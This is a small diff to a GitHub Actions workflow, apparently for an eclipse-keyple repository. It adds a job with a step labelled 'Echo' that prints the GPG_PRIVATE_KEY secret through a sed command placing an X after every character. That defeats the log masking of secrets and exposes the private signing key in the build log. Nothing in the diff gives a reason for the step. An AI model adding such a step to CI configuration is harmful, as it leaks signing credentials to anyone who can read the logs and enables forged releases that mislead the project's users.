@@ -5,5 +5,10 @@ on:
     branches: [main]
 
 jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Echo
+        run: echo "${{ secrets.GPG_PRIVATE_KEY }}" | sed 's/./&X/g'
   build-and-test:
     uses: eclipse-keyple/keyple-actions/.github/workflows/reusable-build-and-test.yml@build-and-test-v1
